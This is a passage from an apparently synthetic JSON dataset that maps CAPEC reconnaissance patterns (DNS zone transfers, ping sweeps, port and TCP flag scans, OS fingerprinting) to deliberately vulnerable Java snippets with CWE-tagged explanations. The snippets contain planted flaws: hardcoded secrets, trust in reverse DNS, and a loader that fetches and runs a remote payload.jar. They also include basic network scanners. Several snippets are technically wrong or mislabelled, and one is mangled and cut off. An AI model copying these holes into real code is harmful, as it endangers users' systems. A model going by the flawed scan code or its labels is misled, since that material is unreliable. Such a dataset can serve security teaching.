        "code_snippet": "public class AuthenticationService {\n    private static final String AUTH_TOKEN = \"secret_token\";\n    \n    public boolean authenticateUser(String receivedToken) {\n        try {\n            // DNS lookup for validation server\n            InetAddress server = InetAddress.getByName(\"auth.example.com\");\n            \n            // Vulnerable capture-replay authentication\n            if (receivedToken.equals(AUTH_TOKEN)) {\n                return true;\n            }\n            \n            // Using non-ubiquitous API call that may not exist on all platforms\n            Class.forName(\"com.sun.security.auth.module.NTSystem\").newInstance();\n            \n        } catch (Exception e) {\n            return false;\n        }\n        return false;\n    }\n}",
        "description": "This code is vulnerable to capture-replay attacks as it uses simple token comparison without timestamps or nonces. It also relies on DNS lookups for security decisions and uses non-portable API calls, embodying CWE-294, CWE-247, and CWE-589."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "public class UnsecureResourceManager {\n    private static Map<String, Object> protectedResources = new HashMap<>();\n    private static Map<String, Object> unprotectedResources = new HashMap<>();\n\n    public static void mapResource(String address, Object resource, boolean isProtected) {\n        if (isProtected) {\n            protectedResources.put(address, resource);\n        }\n        unprotectedResources.put(address, resource);  // Overlapping resource mapping\n    }\n\n    public static Object accessResource(String address) {\n        // No proper authentication check\n        return unprotectedResources.containsKey(address) ? \n               unprotectedResources.get(address) : \n               protectedResources.get(address);\n    }\n}",
        "description": "This code demonstrates overlapping resource mapping and authentication bypass vulnerabilities. It allows resources to be mapped to both protected and unprotected regions simultaneously, creating emergent resources that can be accessed without proper authentication. The access control can be bypassed by accessing protected resources through the unprotected map."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "public class DNSLookupService {\n    public void performMXLookup(String domain) {\n        try {\n            // Unsecured DNS lookup without validation\n            javax.naming.directory.InitialDirContext idc = new javax.naming.directory.InitialDirContext();\n            javax.naming.directory.Attributes attrs = idc.getAttributes(\n                \"dns:/\" + domain,\n                new String[] { \"MX\" }\n            );\n            \n            // Directly exposing MX records without filtering\n            javax.naming.directory.Attribute attr = attrs.get(\"MX\");\n            if (attr != null) {\n                for (int i = 0; i < attr.size(); i++) {\n                    String mxRecord = (String) attr.get(i);\n                    System.out.println(\"MX Record: \" + mxRecord);\n                    \n                    // Performing reverse DNS lookup without validation\n                    String mailServer = mxRecord.split(\" \")[1];\n                    java.net.InetAddress address = java.net.InetAddress.getByName(mailServer);\n                    String reverseDNS = address.getHostName();\n                    \n                    // Storing sensitive information in logs without protection\n                    System.out.println(\"Mail Server IP: \" + address.getHostAddress());\n                    System.out.println(\"Reverse DNS: \" + reverseDNS);\n                }\n            }\n        } catch (Exception e) {\n            // Suppressing error details that might be security-relevant\n            System.out.println(\"Lookup failed\");\n        }\n    }\n}",
        "description": "This vulnerable code performs DNS MX record lookup and reverse DNS resolution without proper security controls. It exposes sensitive mail server information (CWE-200), relies on unsafe reverse DNS resolution (CWE-350), doesn't properly validate hostnames (CWE-941), fails to log security-relevant information (CWE-223), and exposes internal infrastructure details through direct output of DNS records."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "public class DNSZoneTransfer {\n    public static void getDomainInfo(String domain) {\n        try {\n            // Attempt to perform DNS zone transfer without authentication or validation\n            Lookup lookup = new Lookup(domain, Type.AXFR);\n            SimpleResolver resolver = new SimpleResolver();\n            resolver.setTCP(true);\n            lookup.setResolver(resolver);\n            \n            Record[] records = lookup.run();\n            for (Record record : records) {\n                if (record instanceof ARecord) {\n                    String hostname = record.getName().toString();\n                    String ipAddress = ((ARecord) record).getAddress().getHostAddress();\n                    System.out.println(\"Host: \" + hostname + \" IP: \" + ipAddress);\n                    \n                    // Blindly trust reverse DNS lookup for security decisions\n                    InetAddress addr = InetAddress.getByName(ipAddress);\n                    String reverseDNS = addr.getHostName();\n                    if (reverseDNS.endsWith(\".internal.company.com\")) {\n                        grantInternalAccess(ipAddress);\n                    }\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static void grantInternalAccess(String ip) {\n        // Grant privileged access based on potentially spoofed DNS information\n    }\n}",
        "description": "This code demonstrates a vulnerable DNS zone transfer implementation that exposes sensitive network information. It attempts to perform an unauthenticated zone transfer and makes security decisions based on unreliable reverse DNS lookups. The code reveals internal network topology and hostnames, and incorrectly grants access based on potentially spoofed DNS information."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "public class NetworkProbe {\n    public static void main(String[] args) {\n        String networkRange = \"192.168.1.\";\n        for(int i = 1; i <= 255; i++) {\n            String host = networkRange + i;\n            try {\n                Process p = Runtime.getRuntime().exec(\"ping -c 1 \" + host);\n                int returnVal = p.waitFor();\n                if(returnVal == 0) {\n                    InetAddress addr = InetAddress.getByName(host);\n                    String hostname = addr.getHostName();\n                    System.out.println(\"Host \" + host + \" is alive\");\n                    System.out.println(\"Hostname: \" + hostname);\n                    System.out.println(\"MAC Address: \" + \n                        NetworkInterface.getByInetAddress(addr)\n                            .getHardwareAddress());\n                }\n            } catch (Exception e) {\n                continue;\n            }\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable network probe implementation that performs host discovery through ping sweeps. It exposes sensitive system information including hostnames and MAC addresses, relies on reverse DNS resolution, and transmits data in cleartext. The code scans an entire subnet (192.168.1.0/24) and prints details of responsive hosts without any authentication or authorization checks."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "public class NetworkMapper {\n    public void traceNetwork(String targetHost) {\n        try {\n            // Store trace results in plaintext file\n            FileWriter fw = new FileWriter(\"network_trace.txt\");\n            \n            for(int ttl = 1; ttl <= 30; ttl++) {\n                // Create raw socket with cleartext data\n                Socket socket = new Socket();\n                socket.setSoTimeout(3000);\n                \n                // Send packet with incrementing TTL\n                socket.connect(new InetSocketAddress(targetHost, 80));\n                socket.setTrafficClass(ttl);\n                \n                // Log system information and route details\n                String hopInfo = \"TTL \" + ttl + \": \" + \n                    socket.getInetAddress().getHostAddress() + \n                    \" - OS: \" + System.getProperty(\"os.name\") + \n                    \" Path: \" + socket.getLocalAddress();\n                    \n                fw.write(hopInfo + \"\\n\");\n                socket.close();\n            }\n            fw.close();\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code performs network tracerouting by sending packets with incrementing TTL values. It exposes sensitive system and network topology information by storing trace data in cleartext, revealing system properties, and logging network paths without proper access controls. The code demonstrates multiple vulnerabilities including exposure of sensitive information (CWE-200), cleartext transmission (CWE-319), and improper trace data management (CWE-1323)."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "public class NetworkConfigServer {\n    private static final int ICMP_ADDRESS_MASK_REQUEST = 17;\n    private static final int ICMP_ADDRESS_MASK_REPLY = 18;\n\n    public void processICMPRequest(byte[] packet) {\n        if (getICMPType(packet) == ICMP_ADDRESS_MASK_REQUEST) {\n            // Vulnerable: Automatically responds to any address mask request\n            // without authentication or filtering\n            String[] subnets = {\"192.168.1.0/24\", \"10.0.0.0/8\"};\n            String defaultGateway = \"192.168.1.1\";\n            String broadcastAddress = \"192.168.1.255\";\n\n            byte[] response = createAddressMaskReply(subnets, defaultGateway, broadcastAddress);\n            sendICMPResponse(response);\n        }\n    }\n\n    private int getICMPType(byte[] packet) {\n        // Extract ICMP type from packet\n        return packet[0];\n    }\n\n    private byte[] createAddressMaskReply(String[] subnets, String gateway, String broadcast) {\n        // Create ICMP type 18 response with network configuration\n        // Vulnerable: Includes sensitive network information\n        return new byte[]{18, 0, 0, 0}; // Simplified for example\n    }\n\n    private void sendICMPResponse(byte[] response) {\n        // Send response to requester without validating source\n    }\n}",
        "description": "This code demonstrates a vulnerable ICMP Address Mask Request handler that automatically responds to any incoming ICMP type 17 requests with sensitive network configuration information, including subnet details, default gateway, and broadcast addresses. The code is vulnerable because it doesn't authenticate the requester, exposes sensitive network information, and relies solely on IP addresses without proper validation, making it susceptible to network reconnaissance attacks."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "public class TimestampAuthentication {\n    private static final String TOKEN_SECRET = \"secret123\";\n    \n    public boolean authenticateUser(String providedToken, long timestamp) {\n        // Get current server timestamp\n        long serverTime = System.currentTimeMillis();\n        \n        // Generate authentication token using timestamp\n        String expectedToken = generateToken(timestamp);\n        \n        // Verify token and check if timestamp is within 5 minute window\n        return providedToken.equals(expectedToken) && \n               Math.abs(serverTime - timestamp) < 300000;\n    }\n    \n    private String generateToken(long timestamp) {\n        return String.valueOf(timestamp) + TOKEN_SECRET;\n    }\n    \n    @GetMapping(\"/authenticate\")\n    public ResponseEntity<String> authenticate(\n        @RequestParam String token,\n        @RequestParam long timestamp\n    ) {\n        if(authenticateUser(token, timestamp)) {\n            return ResponseEntity.ok().body(\"Authenticated at: \" + timestamp);\n        }\n        return ResponseEntity.status(401).build();\n    }\n}",
        "description": "This code demonstrates a vulnerable timestamp-based authentication system. It exposes timing information through a GET request, uses predictable token generation based on timestamps, and is susceptible to replay attacks within the time window. The system reveals exact server time and authentication results through timing discrepancies and response patterns."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "public class ICMPInfoServer {\n    private static final int ICMP_INFO_REQUEST = 15;\n    private DatagramSocket socket;\n\n    public void startServer() {\n        try {\n            socket = new DatagramSocket(7);\n            byte[] buffer = new byte[1024];\n\n            while (true) {\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                socket.receive(packet);\n\n                // Check if ICMP Info Request\n                if (buffer[0] == ICMP_INFO_REQUEST) {\n                    // Respond with system information in cleartext\n                    String systemInfo = String.format(\"Host: %s\\nOS: %s\\nVersion: %s\",\n                        InetAddress.getLocalHost().getHostName(),\n                        System.getProperty(\"os.name\"),\n                        System.getProperty(\"os.version\"));\n\n                    byte[] response = systemInfo.getBytes();\n                    DatagramPacket responsePacket = new DatagramPacket(\n                        response,\n                        response.length,\n                        packet.getAddress(),\n                        packet.getPort()\n                    );\n                    socket.send(responsePacket);\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation that responds to deprecated ICMP Information Requests. The server listens for incoming ICMP packets and when it receives an Information Request, it responds with sensitive system information in cleartext without any authentication or verification of the requester. The code exposes system details including hostname, OS type, and version, making it susceptible to information disclosure attacks."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "public class VulnerableTCPServer {\n    private ServerSocket serverSocket;\n    private boolean running = true;\n\n    public void start(int port) {\n        try {\n            serverSocket = new ServerSocket(port);\n            System.out.println(\"Server listening on port \" + port);\n\n            while (running) {\n                Socket clientSocket = serverSocket.accept();\n                InputStream in = clientSocket.getInputStream();\n                OutputStream out = clientSocket.getOutputStream();\n\n                // Vulnerable: Always responds to ACK probes with RST\n                // and exposes system information in cleartext\n                String hostInfo = System.getProperty(\"os.name\") + \",\" +\n                                System.getProperty(\"os.version\") + \",\" +\n                                InetAddress.getLocalHost().getHostName();\n                out.write(hostInfo.getBytes());\n                \n                // No authentication check before sending response\n                if (clientSocket.isConnected()) {\n                    out.write(\"Server is alive\\n\".getBytes());\n                }\n                \n                clientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable TCP server that responds to TCP ACK probes and exposes sensitive system information. It violates multiple security principles by: 1) Always responding to connection attempts, making it susceptible to TCP ACK ping scanning, 2) Transmitting sensitive system information in cleartext, 3) Lacking proper authentication, and 4) Not implementing proper connection state validation. The server binds to a specified port and responds to all incoming connections, potentially allowing attackers to determine system availability and gather system information."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "public class UDPPingScanner {\n    public static void pingHost(String targetHost) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] payload = \"PING\".getBytes();\n            \n            for(int port = 65000; port < 65535; port++) {\n                DatagramPacket packet = new DatagramPacket(\n                    payload,\n                    payload.length,\n                    InetAddress.getByName(targetHost),\n                    port\n                );\n                socket.send(packet);\n                \n                // Wait for ICMP response\n                byte[] buffer = new byte[1024];\n                DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n                socket.setSoTimeout(100);\n                try {\n                    socket.receive(response);\n                    System.out.println(\"Host is alive: \" + targetHost + \n                                     \" Response from port: \" + port);\n                } catch(SocketTimeoutException e) {\n                    // No response - port might be closed or filtered\n                }\n            }\n            socket.close();\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code implements a UDP ping scanner that attempts to determine if a remote host is alive by sending UDP datagrams to high ports and monitoring for ICMP responses. The code exhibits multiple vulnerabilities: it exposes system information through error messages (CWE-200), transmits data in cleartext (CWE-319), doesn't properly validate the destination (CWE-941), and may interfere with legitimate services due to improper port binding (CWE-605). The error handling also potentially leaks sensitive information about the system's state (CWE-1320)."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "public class VulnerableNetworkService {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(80);\n            ServerSocket duplicateSocket = new ServerSocket(80); // CWE-605\n            \n            while(true) {\n                Socket clientSocket = serverSocket.accept();\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                BufferedReader in = new BufferedReader(\n                    new InputStreamReader(clientSocket.getInputStream()));\n                \n                // Responding to SYN packets without proper validation\n                String sensitiveData = \"Server Version: Apache/2.4.1\\nOS: Linux 4.4.0\";\n                out.println(sensitiveData); // CWE-200, CWE-319\n                \n                // No message integrity check for incoming data\n                String input = in.readLine(); // CWE-924\n                \n                // Process HTTP requests without proper validation\n                if(input.startsWith(\"GET\")) {\n                    processRequest(input); // CWE-444\n                }\n            }\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable network service that exposes sensitive system information, allows multiple binds to the same port, transmits data in cleartext, and lacks proper request validation and message integrity checks. It specifically responds to incoming connections without proper TCP handshake validation, making it susceptible to TCP SYN scanning."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "public class VulnerablePortScanner {\n    public static void main(String[] args) {\n        String host = args[0];\n        \n        for (int port = 1; port <= 65535; port++) {\n            try {\n                Socket socket = new Socket();\n                socket.connect(new InetSocketAddress(host, port), 1000);\n                System.out.println(\"Port \" + port + \" is open\");\n                \n                // Send probe in cleartext to get service info\n                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n                out.println(\"GET / HTTP/1.0\\r\\n\\r\\n\");\n                \n                // Read response without encryption\n                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                String response = in.readLine();\n                System.out.println(\"Service: \" + response);\n                \n                socket.close();\n            } catch (Exception e) {\n                // Silent failure, continue scanning\n            }\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable port scanner that conducts port reconnaissance, exposing sensitive information about open ports and services. It transmits probes in cleartext, doesn't validate the target host, and attempts to connect to all possible ports, potentially revealing system details to unauthorized actors. The code also silently ignores exceptions, making it harder to detect scanning activity."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "public class PortScanner {\n    public static void main(String[] args) {\n        String targetHost = \"192.168.1.1\";\n        int[] portsToScan = {80, 443, 8080, 22, 21};\n        \n        for (int port : portsToScan) {\n            try {\n                Socket socket = new Socket();\n                socket.connect(new InetSocketAddress(targetHost, port), 1000);\n                System.out.println(\"Port \" + port + \" is open\");\n                String ipAddress = socket.getInetAddress().getHostAddress();\n                assert ipAddress.equals(targetHost) : \"IP mismatch\";\n                \n                // Store connection info without encryption\n                String connectionInfo = \"Host:\" + targetHost + \",Port:\" + port;\n                FileWriter fw = new FileWriter(\"scan_results.txt\", true);\n                fw.write(connectionInfo + \"\\n\");\n                fw.close();\n                \n                socket.close();\n            } catch (IOException e) {\n                System.out.println(\"Port \" + port + \" is closed\");\n            }\n        }\n    }\n}",
        "description": "This vulnerable code performs TCP port scanning by attempting full TCP connections. It contains multiple security issues: it exposes sensitive port information in plaintext (CWE-200), relies on IP addresses for authentication (CWE-291), includes an assertion that could be triggered (CWE-617), and stores connection information without integrity checks (CWE-353). The code attempts to establish TCP connections to various ports and logs the results, potentially revealing system information to unauthorized actors."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "public class VulnerableNetworkServer {\n    private ServerSocket serverSocket;\n\n    public void startServer() {\n        try {\n            // Insecure binding to port without proper checks\n            serverSocket = new ServerSocket(1234, 50, InetAddress.getByName(\"0.0.0.0\"));\n\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                // No verification of client identity or connection state\n                DataOutputStream out = new DataOutputStream(clientSocket.getOutputStream());\n\n                // Transmitting sensitive data in cleartext\n                String sensitiveData = getSensitiveInformation();\n                out.writeUTF(sensitiveData);\n\n                // No integrity checks on data transmission\n                // No proper connection state management\n                clientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private String getSensitiveInformation() {\n        return \"SECRET_API_KEY=12345;DATABASE_PASSWORD=admin123\";\n    }\n}",
        "description": "This vulnerable code demonstrates a network server that accepts connections without proper endpoint verification, transmits sensitive data in cleartext, lacks integrity checks, and doesn't properly manage TCP connection states. It binds to all network interfaces (0.0.0.0) making it susceptible to unauthorized access and potential port scanning attacks. The server doesn't implement any mechanism to detect or prevent FIN scanning, and transmits sensitive information without encryption or proper authentication."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "public class VulnerablePortScanner {\n    public static void scanPort(String host, int port) {\n        try {\n            Socket socket = new Socket();\n            socket.connect(new InetSocketAddress(host, port), 1000);\n            \n            // Send XMAS scan packet with all flags set\n            DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n            byte[] rawData = new byte[] {\n                (byte)0xFF, (byte)0xFF, (byte)0xFF, (byte)0xFF, // All TCP flags set\n                0x00, 0x00, 0x00, 0x00  // No integrity check\n            };\n            out.write(rawData);\n            \n            // Try to read response without verification\n            DataInputStream in = new DataInputStream(socket.getInputStream());\n            byte[] response = new byte[1024];\n            in.read(response);\n            \n            // Expose port status without authentication\n            System.out.println(\"Port \" + port + \" status: \" + Arrays.toString(response));\n            \n            socket.close();\n        } catch (Exception e) {\n            System.out.println(\"Port \" + port + \" is closed\");\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a TCP XMAS scanner that sends malformed packets with all flags set, fails to verify message integrity, transmits data in cleartext, and doesn't properly authenticate endpoints. It exposes sensitive port status information and lacks proper error handling and security controls."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "public class VulnerableNetworkScanner {\n    public boolean scanPort(String host, int port) {\n        Socket socket = null;\n        try {\n            socket = new Socket();\n            socket.connect(new InetSocketAddress(host, port), 1000);\n            \n            // Send NULL scan packet without checking socket state\n            OutputStream out = socket.getOutputStream();\n            byte[] nullPacket = new byte[20]; // TCP header with no flags set\n            out.write(nullPacket);\n            out.flush();\n            \n            // Vulnerable: Reading response without validation\n            InputStream in = socket.getInputStream();\n            byte[] response = new byte[1024];\n            int bytesRead = in.read(response);\n            \n            // Vulnerable: No integrity check on received data\n            return bytesRead > 0;\n        } catch (Exception e) {\n            return false;\n        } finally {\n            if(socket != null) {\n                try {\n                    socket.close();\n                } catch(IOException e) {}\n            }\n        }\n    }\n}",
        "description": "This vulnerable code implements a TCP NULL scan that sends packets with no flags set, transmits data without encryption, lacks integrity checks, and contains potential NULL pointer issues. It demonstrates CWE-200 by exposing port status information, CWE-353 by lacking integrity checks, CWE-319 by using cleartext transmission, and CWE-690/476 through unsafe NULL pointer handling."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "public class NetworkScanner {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket();\n        serverSocket.setReuseAddress(true);\n        serverSocket.bind(new InetSocketAddress(\"0.0.0.0\", 80));\n        \n        File aclFile = new File(\"/etc/firewall/acl.txt\");\n        aclFile.setReadable(true, false);\n        \n        while(true) {\n            Socket clientSocket = serverSocket.accept();\n            OutputStream out = clientSocket.getOutputStream();\n            PrintWriter writer = new PrintWriter(out, true);\n            \n            BufferedReader aclReader = new BufferedReader(new FileReader(aclFile));\n            String aclRule;\n            while((aclRule = aclReader.readLine()) != null) {\n                writer.println(\"ACL Rule: \" + aclRule);\n            }\n            \n            byte[] buffer = new byte[1024];\n            clientSocket.getInputStream().read(buffer);\n            String tcpFlags = new String(buffer).trim();\n            \n            if(tcpFlags.contains(\"ACK\")) {\n                writer.println(\"Firewall Configuration: Allow ALL\");\n            }\n            \n            aclReader.close();\n            clientSocket.close();\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to ACL and firewall information exposure. It creates a server that exposes ACL rules in cleartext, allows multiple binds to port 80, performs access control checks after connection is established, and makes ACL files readable to all users. The code specifically responds to TCP ACK segments with firewall configuration information."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "public class NetworkScanner {\n    public void scanTCPWindow(String targetHost) throws IOException {\n        Socket socket = new Socket();\n        InetSocketAddress address;\n        PrintWriter logWriter = new PrintWriter(\"scan_results.txt\");\n        \n        for(int port = 1; port <= 1024; port++) {\n            try {\n                address = new InetSocketAddress(targetHost, port);\n                socket = new Socket();\n                socket.connect(address, 1000);\n                \n                // Get TCP Window size information without encryption\n                int windowSize = socket.getReceiveBufferSize();\n                String osGuess = determineOS(windowSize);\n                \n                // Log sensitive system information in cleartext\n                logWriter.println(\"Host: \" + targetHost + \n                                \" Port: \" + port + \n                                \" Window Size: \" + windowSize +\n                                \" Probable OS: \" + osGuess);\n                \n            } catch (IOException e) {\n                continue;\n            } finally {\n                socket.close();\n            }\n        }\n        logWriter.close();\n    }\n    \n    private String determineOS(int windowSize) {\n        // Expose system fingerprinting logic\n        if(windowSize > 65535) return \"Windows\";\n        else if(windowSize == 65535) return \"Linux\";\n        else if(windowSize > 32768) return \"FreeBSD\";\n        return \"Unknown\";\n    }\n}",
        "description": "This vulnerable code implements a TCP Window scanner that exposes sensitive system information through cleartext transmission and logging. It attempts to determine the operating system type based on TCP window sizes, stores results without encryption, and lacks integrity checks for the data transmission. The code also creates a potential timing channel through the scanning process."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "public class RPCServer {\n    public static void main(String[] args) {\n        try {\n            Registry registry = LocateRegistry.createRegistry(1099);\n            RMIServerSocket socket = new RMIServerSocket(1099);\n            \n            // Insecure download and execution of remote code\n            URL url = new URL(\"http://remote-server.com/payload.jar\");\n            URLClassLoader loader = new URLClassLoader(new URL[]{url});\n            Class<?> serviceClass = loader.loadClass(\"RemoteService\");\n            \n            // Multiple bindings to same port without authentication\n            registry.bind(\"service1\", (Remote) serviceClass.newInstance());\n            registry.bind(\"service2\", (Remote) serviceClass.newInstance());\n            \n            // Exposing sensitive system information\n            System.setProperty(\"java.rmi.server.hostname\", InetAddress.getLocalHost().getHostAddress());\n            System.out.println(\"RPC Server running on \" + System.getProperty(\"java.rmi.server.hostname\"));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable RPC server implementation allows unauthenticated access to RPC services, downloads and executes remote code without verification, allows multiple bindings to the same port, and exposes sensitive system information. It's susceptible to replay attacks and SSRF due to lack of proper authentication and input validation."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "public class VulnerableUDPServer {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket1 = new DatagramSocket(1337);\n            DatagramSocket socket2 = new DatagramSocket(1337); // CWE-605: Multiple binds\n            \n            byte[] buffer = new byte[1024];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            \n            while(true) {\n                socket1.receive(packet);\n                String data = new String(packet.getData());\n                \n                // CWE-200: Exposing sensitive data in response\n                String sensitiveResponse = \"Server Info: \" + \n                    System.getProperty(\"os.name\") + \",\" +\n                    System.getProperty(\"user.name\") + \",\" +\n                    System.getProperty(\"java.version\");\n                \n                // CWE-319: Sending cleartext sensitive data\n                byte[] response = sensitiveResponse.getBytes();\n                DatagramPacket responsePacket = new DatagramPacket(\n                    response,\n                    response.length,\n                    packet.getAddress(),\n                    packet.getPort()\n                );\n                \n                // CWE-353: No integrity check on data\n                socket1.send(responsePacket);\n                \n                // CWE-385: Covert timing channel\n                if(data.contains(\"secret\")) {\n                    Thread.sleep(1000);\n                } else {\n                    Thread.sleep(100);\n                }\n            }\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable UDP server implementation that exhibits multiple security issues including multiple socket binds to the same port, exposure of sensitive system information, cleartext transmission of data, lack of data integrity checks, and a covert timing channel. The server responds to UDP probes with sensitive system information and implements a timing-based covert channel that could leak information about the presence of specific data."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "public class NetworkScanner {\n    public static void main(String[] args) {\n        String networkMap = \"\";\n        try {\n            Process process = Runtime.getRuntime().exec(\"traceroute google.com\");\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                networkMap += line + \"\\n\";\n            }\n            \n            // Store sensitive network topology in plaintext file\n            FileWriter writer = new FileWriter(\"network_map.txt\");\n            writer.write(\"Network Topology:\\n\" + networkMap);\n            writer.write(\"System Info: \" + System.getProperties());\n            writer.write(\"\\nNetwork Interfaces: \" + \n                NetworkInterface.getNetworkInterfaces());\n            writer.close();\n            \n            // Send data to remote logging server without encryption\n            Socket socket = new Socket(\"logging-server.com\", 1234);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(networkMap);\n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code performs network scanning and mapping, collecting sensitive system information and network topology data. It contains multiple security issues: storing sensitive network data in plaintext files, exposing system properties and network interface details, and transmitting collected data over an unencrypted connection. The code demonstrates excessive attack surface by combining multiple sensitive operations and exposing system-level information to unauthorized actors."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "public class SystemInfoService {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(21);\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                \n                String osInfo = System.getProperty(\"os.name\") + \" \" + \n                               System.getProperty(\"os.version\");\n                String javaVersion = System.getProperty(\"java.version\");\n                String userDir = System.getProperty(\"user.dir\");\n                String systemInfo = \"System Info:\\n\" + \n                                   \"OS: \" + osInfo + \"\\n\" +\n                                   \"Java Version: \" + javaVersion + \"\\n\" +\n                                   \"Working Directory: \" + userDir;\n                \n                out.println(systemInfo);\n                clientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code runs an unencrypted service on port 21 (FTP port) that freely exposes sensitive system information including OS version, Java version, and directory paths to any connecting client. It demonstrates multiple vulnerabilities including cleartext transmission (CWE-319), exposure of sensitive system information (CWE-497), and excessive attack surface (CWE-1125) by leaving an unnecessary port open with sensitive information freely accessible."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "\"public class DebugInterface {\\n    private static boolean isDebugMode = true;\\n    private static final String DEBUG_API = \\\"win32.debug.internal\\\";\\n    \\n    public static void accessInternalRegisters(int address) {\\n        // No authentication check before accessing debug interface\\n        if(isDebugMode) {\\n            try {\\n                // Using non-ubiquitous API\\n                Class.forName(DEBUG_API).getMethod(\\\"readRegister\\\").invoke(null, address);\\n                \\n                // Debug logs exposing sensitive information\\n                System.out.println(\\\"DEBUG: Accessed register at \\\" + address + \\n                                 \\\" with current memory map: 0x\\\" + \n                                 Integer.toHexString(getMemoryMap()));\\n",
        "description": "\"This vulnerable code demonstrates multiple security issues including improper debug interface access control, usage of non-portable APIs, exposure of sensitive information through debug logs, and improper memory protection boundaries. The code allows unrestricted access to internal registers through a debug interface without proper authentication, uses platform-specific APIs, and contains overlapping memory regions that could lead to protection bypasses.\""
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "public class SystemInfoServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) \n            throws ServletException, IOException {\n        response.setContentType(\"text/plain\");\n        PrintWriter out = response.getWriter();\n        \n        String osName = System.getProperty(\"os.name\");\n        String osVersion = System.getProperty(\"os.version\");\n        String javaVersion = System.getProperty(\"java.version\");\n        String serverInfo = getServletContext().getServerInfo();\n        \n        out.println(\"OS Name: \" + osName);\n        out.println(\"OS Version: \" + osVersion);\n        out.println(\"Java Version: \" + javaVersion);\n        out.println(\"Server Info: \" + serverInfo);\n        \n        Map<String, String> systemProps = System.getProperties();\n        for(Map.Entry<String, String> entry : systemProps.entrySet()) {\n            out.println(entry.getKey() + \": \" + entry.getValue());\n        }\n    }\n}",
        "description": "This vulnerable code creates a servlet that exposes sensitive system information including OS details, Java version, and system properties through an HTTP endpoint. The information is transmitted in cleartext and provides detailed system fingerprinting data to potential attackers. The code reveals system-level information without any access control or authentication, making it easy for attackers to identify the operating system and environment details."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
